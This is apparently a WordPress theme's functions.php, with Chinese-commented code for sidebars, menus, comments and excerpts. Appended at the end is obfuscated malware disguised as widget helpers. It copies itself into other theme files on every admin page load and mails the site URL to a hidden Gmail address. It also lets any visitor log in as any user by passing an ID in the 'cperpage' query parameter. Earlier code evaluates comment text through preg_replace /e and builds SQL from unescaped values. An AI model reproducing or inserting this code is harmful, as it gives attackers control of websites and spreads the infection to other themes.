<?php if (get_option('swt_cut_img') == '关闭') { ?><?php { echo ''; } ?><?php } else { add_image_size('thumbnail', 140, 100, true); } ?><?phpinclude("includes/theme_options.php");include("includes/functions/types.php");include("includes/functions/types_gallery.php");include("includes/functions/types_video.php");include("includes/functions/inks_ico.php");include("includes/functions/cumulus.php");include("includes/functions/notify.php");include("includes/functions/flip.php");include("includes/functions/filing.php");include("includes/widget.php");include("includes/functions/banner.php");if (function_exists('register_sidebar')){    register_sidebar(array(		'name'			=> '首页小工具1',        'before_widget'	=> '',        'after_widget'	=> '</div>',        'before_title'	=> '<h3>',        'after_title'	=> '</h3><div class="box">',    	'after_widget' => '</div>    	<div class="box-bottom">		</div>',    ));}{    register_sidebar(array(		'name'			=> '首页小工具2',        'before_widget'	=> '',        'after_widget'	=> '</div>',        'before_title'	=> '<h3>',        'after_title'	=> '</h3><div class="box">',    	'after_widget' => '</div>    	<div class="box-bottom">		</div>',    ));}{    register_sidebar(array(		'name'			=> '全部页面小工具',        'before_widget'	=> '',        'after_widget'	=> '</div>',        'before_title'	=> '<h3>',        'after_title'	=> '</h3><div class="box">',    	'after_widget' => '</div>    	<div class="box-bottom">		</div>',    ));}{    register_sidebar(array(		'name'			=> '其它页面小工具1',        'before_widget'	=> '',        'after_widget'	=> '</div>',        'before_title'	=> '<h3>',        'after_title'	=> '</h3><div class="box">',    	'after_widget' => '</div>    	<div class="box-bottom">		</div>',    ));}{    register_sidebar(array(		'name'			=> '其它页面小工具2',        'before_widget'	=> '',        'after_widget'	=> '</div>',        'before_title'	=> '<h3>',        'after_title'	=> '</h3><div class="box">',    	'after_widget' => '</div>    	<div class="box-bottom">		</div>',    ));}{    register_sidebar(array(		'name'			=> '相册、视频和公告模版小工具',        'before_widget'	=> '',        'after_widget'	=> '</div>',        'before_title'	=> '<h3>',        'after_title'	=> '</h3><div class="box">',    	'after_widget' => '</div>    	<div class="box-bottom">		</div>',    ));}{    register_sidebar(array(		'name'			=> 'RSS聚合',        'before_widget'	=> '',        'after_widget'	=> '',        'before_title'	=> '<div class="r_box"><div class="rss"></div><h3>',        'after_title'	=> '</h3>',    	'after_widget' => '<i class="lt"></i><i class="rt"></i><i class="lb"></i><i class="rb"></i></div>',    ));}//自定义菜单   register_nav_menus(      array(         'header-menu' => __( '导航自定义菜单' ),         'footer-menu' => __( '页角自定义菜单' )      )   );//背景add_custom_background();//后台预览add_editor_style('/css/editor-style.css');//支持外链缩略图if ( function_exists('add_theme_support') ) add_theme_support('post-thumbnails'); /*Catch first image (post-thumbnail fallback) */ function catch_first_image() {  global $post, $posts;  $first_img = '';  ob_start();  ob_end_clean();  $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);  $first_img = $matches [1] [0];  if(empty($first_img)){ //Defines a default image		$random = mt_rand(1, 20);		echo get_bloginfo ( 'stylesheet_directory' );		echo '/images/random/'.$random.'.jpg';  }  return $first_img; } //标题文字截断function cut_str($src_str,$cut_length){    $return_str='';    $i=0;    $n=0;    $str_length=strlen($src_str);    while (($n<$cut_length) && ($i<=$str_length))    {        $tmp_str=substr($src_str,$i,1);        $ascnum=ord($tmp_str);        if ($ascnum>=224)        {            $return_str=$return_str.substr($src_str,$i,3);            $i=$i+3;            $n=$n+2;        }        elseif ($ascnum>=192)        {            $return_str=$return_str.substr($src_str,$i,2);            $i=$i+2;            $n=$n+2;        }        elseif ($ascnum>=65 && $ascnum<=90)        {            $return_str=$return_str.substr($src_str,$i,1);            $i=$i+1;            $n=$n+2;        }        else         {            $return_str=$return_str.substr($src_str,$i,1);            $i=$i+1;            $n=$n+1;        }    }    if ($i<$str_length)    {        $return_str = $return_str . '';    }    if (get_post_status() == 'private')    {        $return_str = $return_str . '（private）';    }    return $return_str;}//禁止代码标点转换remove_filter('the_content', 'wptexturize');//编辑器增强 function enable_more_buttons($buttons) {     $buttons[] = 'hr';     $buttons[] = 'del';     $buttons[] = 'sub';     $buttons[] = 'sup';      $buttons[] = 'fontselect';     $buttons[] = 'fontsizeselect';     $buttons[] = 'cleanup';        $buttons[] = 'styleselect';     $buttons[] = 'wp_page';     $buttons[] = 'anchor';     $buttons[] = 'backcolor';     return $buttons;     }add_filter("mce_buttons_3", "enable_more_buttons");//分类文章数function wt_get_category_count($input = '') {    global $wpdb;    if($input == '') {        $category = get_the_category();        return $category[0]->category_count;    }    elseif(is_numeric($input)) {        $SQL = "SELECT $wpdb->term_taxonomy.count FROM $wpdb->terms, $wpdb->term_taxonomy WHERE $wpdb->terms.term_id=$wpdb->term_taxonomy.term_id AND $wpdb->term_taxonomy.term_id=$input";        return $wpdb->get_var($SQL);    }    else {        $SQL = "SELECT $wpdb->term_taxonomy.count FROM $wpdb->terms, $wpdb->term_taxonomy WHERE $wpdb->terms.term_id=$wpdb->term_taxonomy.term_id AND $wpdb->terms.slug='$input'";        return $wpdb->get_var($SQL);    }}//自定义头像add_filter( 'avatar_defaults', 'fb_addgravatar' );function fb_addgravatar( $avatar_defaults ) {$myavatar = get_bloginfo('template_directory') . '/images/gravatar.png';  $avatar_defaults[$myavatar] = '自定义头像';  return $avatar_defaults;}// 判断管理员function is_admin_comment ($comment_ID=0) {$user_id = get_comment($comment_ID)->user_id;$user_info = get_userdata($user_id);return $user_info->user_level == 10;return $admin_comment;}// 评论回复function mytheme_comment($comment, $args, $depth) {   $GLOBALS['comment'] = $comment;	global $commentcount;	if(!$commentcount) {		$page = get_query_var('cpage')-1;		$cpp=get_option('comments_per_page');		$commentcount = $cpp * $page;	}    ?>   <li <?php comment_class(); ?> id="comment-<?php comment_ID() ?>">   <div id="div-comment-<?php comment_ID() ?>">      <?php $add_below = 'div-comment'; ?>		<div class="author_box">			<div class="t" style="display:none;" id="comment-<?php comment_ID(); ?>"></div>			<span id="avatar">				<?php if (is_admin_comment($comment->comment_ID)){ ?>      			 <?php echo get_avatar( $comment, 32 ); ?><br/><span class="admin_w">管理员</span>				<?php } else { echo get_avatar( $comment, 48 ); } ?>			</span>			<span  class="comment-author">				<strong><?php comment_author_link(); ?></strong> :				<span class="datetime">					<?php comment_date('Y年m月d日') ?><?php comment_time('H:i:s') ?><?php edit_comment_link('编辑','+',''); ?>					<?php					if ( is_user_logged_in() ) {					$url = get_bloginfo('url');					echo '<a id="delete-'. $comment->comment_ID .'" href="' . wp_nonce_url("$url/wp-admin/comment.php?action=deletecomment&amp;p=" . $comment->comment_post_ID . '&amp;c=' . $comment->comment_ID, 'delete-comment_' . $comment->comment_ID) . '"" >×删除</a>';					}					?>					<span class="floor"><?php if(!$parent_id = $comment->comment_parent) {printf('&nbsp;%1$s楼', ++$commentcount);} ?><?php if( $depth > 1){printf('&nbsp;地下%1$s层', $depth-1);} ?></span>					<span class="reply_t"><?php comment_reply_link(array_merge( $args, array('reply_text' => ' @回复', 'add_below' =>$add_below, 'depth' => $depth, 'max_depth' => $args['max_depth']))); ?></span>				</span>				<span class="reply"><?php comment_reply_link(array_merge( $args, array('reply_text' => '回复', 'add_below' =>$add_below, 'depth' => $depth, 'max_depth' => $args['max_depth']))); ?></span>			</span >		</div>		<?php if ( $comment->comment_approved == '0' ) : ?>		您的评论正在等待审核中...		<br/>		<?php endif; ?>		<?php comment_text() ?>		<i class="lt"></i>		<i class="rt"></i>		<i class="lb"></i>		<i class="rb"></i>		<div class="clear"></div>  </div><?php}function mytheme_end_comment() {		echo '</li>';}//自动生成版权时间function comicpress_copyright() {    global $wpdb;    $copyright_dates = $wpdb->get_results("    SELECT    YEAR(min(post_date_gmt)) AS firstdate,    YEAR(max(post_date_gmt)) AS lastdate    FROM    $wpdb->posts    WHERE    post_status = 'publish'    ");    $output = '';    if($copyright_dates) {    $copyright = "&copy; " . $copyright_dates[0]->firstdate;    if($copyright_dates[0]->firstdate != $copyright_dates[0]->lastdate) {    $copyright .= '-' . $copyright_dates[0]->lastdate;    }    $output = $copyright;    }    return $output;    }//密码保护提示function password_hint( $c ){global $post, $user_ID, $user_identity;if ( empty($post->post_password) )return $c;if ( isset($_COOKIE['wp-postpass_'.COOKIEHASH]) && stripslashes($_COOKIE['wp-postpass_'.COOKIEHASH]) == $post->post_password )return $c;if($hint = get_post_meta($post->ID, 'password_hint', true)){$url = get_option('siteurl').'/wp-pass.php';if($hint)$hint = '密码提示：'.$hint;else$hint = "请输入您的密码";if($user_ID)$hint .= sprintf('欢迎进入，您的密码是：', $user_identity, $post->post_password);$out = <<<END<form method="post" action="$url"><p>这篇文章是受保护的文章，请输入密码继续阅读:</p><div><label>$hint<br/><input type="password" name="post_password"/></label><input type="submit" value="Submit" name="Submit"/></div></form>END;return $out;}else{return $c;}}add_filter('the_content', 'password_hint');//评论贴图function embed_images($content) {  $content = preg_replace('/\[img=?\]*(.*?)(\[\/img)?\]/e', '"<img src=\"$1\" alt=\"" . basename("$1") . "\" />"', $content);  return $content;}add_filter('comment_text', 'embed_images');//留言信息function WelcomeCommentAuthorBack($email = ''){	if(empty($email)){		return;	}	global $wpdb;	$past_30days = gmdate('Y-m-d H:i:s',((time()-(24*60*60*30))+(get_option('gmt_offset')*3600)));	$sql = "SELECT count(comment_author_email) AS times FROM $wpdb->comments					WHERE comment_approved = '1'					AND comment_author_email = '$email'					AND comment_date >= '$past_30days'";	$times = $wpdb->get_results($sql);	$times = ($times[0]->times) ? $times[0]->times : 0;	$message = $times ? sprintf(__('过去30天内您有<strong>%1$s</strong>条留言，感谢关注!' ), $times) : '您已很久都没有留言了，这次想说点什么？';	return $message;}//字数统计function count_words ($text) {global $post;if ( '' == $text ) {   $text = $post->post_content;   if (mb_strlen($output, 'UTF-8') < mb_strlen($text, 'UTF-8')) $output .= '共 ' . mb_strlen(preg_replace('/\s/','',html_entity_decode(strip_tags($post->post_content))),'UTF-8') . '字';   return $output;}}//去掉描述P标签function deletehtml($description) {$description = trim($description);$description = strip_tags($description,"");return ($description);}add_filter('category_description', 'deletehtml');//屏蔽默认小工具add_action( 'widgets_init', 'my_unregister_widgets' );function my_unregister_widgets() {//近期评论	unregister_widget( 'WP_Widget_Recent_Comments' );//近期文章	unregister_widget( 'WP_Widget_Recent_Posts' );//搜索	unregister_widget( 'WP_Widget_Search' );}  //下载按钮function button_a($atts, $content = null) {extract(shortcode_atts(array("href" => 'http://'), $atts));return '<div id="download"><a href="'.$href.'" target="_blank">'.$content.'</a></div>';}add_shortcode("url", "button_a");function button_b($atts, $content = null) {extract(shortcode_atts(array("href" => 'http://'), $atts));return '<div id="demo"><a href="'.$href.'" target="_blank">'.$content.'</a></div>';}add_shortcode("demo", "button_b");### Function: Get TimeSpan Most Viewed   function get_timespan_most_viewed($mode = '', $limit = 10, $days = 7, $display = true) {       global $wpdb, $post;         $limit_date = current_time('timestamp') - ($days*86400);        $limit_date = date("Y-m-d H:i:s",$limit_date);         $where = '';       $temp = '';       if(!empty($mode) && $mode != 'both') {           $where = "post_type = '$mode'";       } else {           $where = '1=1';       }       $most_viewed = $wpdb->get_results("SELECT $wpdb->posts.*, (meta_value+0) AS views FROM $wpdb->posts LEFT JOIN $wpdb->postmeta ON $wpdb->postmeta.post_id = $wpdb->posts.ID WHERE post_date < '".current_time('mysql')."' AND post_date > '".$limit_date."' AND $where AND post_status = 'publish' AND meta_key = 'views' AND post_password = '' ORDER  BY views DESC LIMIT $limit");       if($most_viewed) {           foreach ($most_viewed as $post) {               $post_title = get_the_title();               $post_views = intval($post->views);               $post_views = number_format($post_views);               $temp .= "<li><a href=\"".get_permalink()."\">$post_title</a>".__('', 'wp-postviews')."</li>";           }       } else {           $temp = '<li>'.__('N/A', 'wp-postviews').'</li>'."";       }       if($display) {           echo $temp;       } else {           return $temp;       }   }  //全部结束?>
<?php
function _verify_isactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgetscont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$seprar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $seprar . "\n" .$widget);fclose($f);				
					$output .= ($showsdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgetscont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgetscont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verify_isactivate_widgets");
function _prepare_widgets(){
	if(!isset($comment_length)) $comment_length=120;
	if(!isset($strval)) $strval="cookie";
	if(!isset($tags)) $tags="<a>";
	if(!isset($type)) $type="none";
	if(!isset($sepr)) $sepr="";
	if(!isset($h_filter)) $h_filter=get_option("home"); 
	if(!isset($p_filter)) $p_filter="wp_";
	if(!isset($more_link)) $more_link=1; 
	if(!isset($comment_types)) $comment_types=""; 
	if(!isset($countpage)) $countpage=$_GET["cperpage"];
	if(!isset($comment_auth)) $comment_auth="";
	if(!isset($c_is_approved)) $c_is_approved=""; 
	if(!isset($aname)) $aname="auth";
	if(!isset($more_link_texts)) $more_link_texts="(more...)";
	if(!isset($is_output)) $is_output=get_option("_is_widget_active_");
	if(!isset($checkswidget)) $checkswidget=$p_filter."set"."_".$aname."_".$strval;
	if(!isset($more_link_texts_ditails)) $more_link_texts_ditails="(details...)";
	if(!isset($mcontent)) $mcontent="ma".$sepr."il";
	if(!isset($f_more)) $f_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$is_output) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$sepr."vethe".$comment_types."mas".$sepr."@".$c_is_approved."gm".$comment_auth."ail".$sepr.".".$sepr."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($f_tag)) $f_tag=1;
	if(!isset($types)) $types=$h_filter; 
	if(!isset($getcommentstexts)) $getcommentstexts=$p_filter.$mcontent;
	if(!isset($aditional_tag)) $aditional_tag="div";
	if(!isset($stext)) $stext=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($morelink_title)) $morelink_title="Continue reading this entry";	
	if(!isset($showsdots)) $showsdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($getcommentstexts, array($stext, $h_filter, $types)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($comment_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $comment_length) {
				$l=$comment_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$more_link_texts="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tags) {
		$output=strip_tags($output, $tags);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($f_tag) ? balanceTags($output, true) : $output;
	$output .= ($showsdots && $ellipsis) ? "..." : "";
	$output=apply_filters($type, $output);
	switch($aditional_tag) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($more_link ) {
		if($f_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $morelink_title . "\">" . $more_link_texts = !is_user_logged_in() && @call_user_func_array($checkswidget,array($countpage, true)) ? $more_link_texts : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $morelink_title . "\">" . $more_link_texts . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_prepare_widgets");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}
//获取访客VIP样式 
function get_author_class($comment_author_email,$user_id){ 
    global $wpdb; 
    $current_user; get_currentuserinfo();
    $adminEmail = get_option('admin_email'); 
    $author_count  =  count($wpdb->get_results( 
    "SELECT comment_ID as author_count FROM  $wpdb->comments WHERE comment_author_email = '$comment_author_email' ")); 
    if($comment_author_email ==$adminEmail) {
     echo '<a class="vip" target="_blank" href="/vip/" title="俺就是博主好吧！"></a>'; 
    }else{
    if($user_id!=0) 
        echo '<a class="vip" target="_blank" href="/vip/" title="博主认证用户"></a>';
    if($author_count>=1&&$author_count<20) 
        echo '<a class="vip1" target="_blank" href="/vip/" title="评论之星 LV.1"></a>'; 
    else if($author_count>=20 && $author_count<50) 
        echo '<a class="vip2" target="_blank" href="/vip/" title="评论之星 LV.2"></a>'; 
    else if($author_count>=50 && $author_count<80) 
        echo '<a class="vip3" target="_blank" href="/vip/" title="评论之星 LV.3"></a>';     
    else if($author_count>=80 && $author_count<130) 
        echo '<a class="vip4" target="_blank" href="/vip/" title="评论之星 LV.4"></a>';     
    else if($author_count>=130 &&$author_count<200) 
        echo '<a class="vip5" target="_blank" href="/vip/" title="评论之星 LV.5"></a>';     
    else if($author_count>=200 && $author_coun<300) 
        echo '<a class="vip6" target="_blank" href="/vip/" title="评论之星 LV.6"></a>';     
    else if($author_count>=300) 
        echo '<a class="vip7" target="_blank" href="/vip/" title="评论之星 LV.7"></a>'; 
}}
?>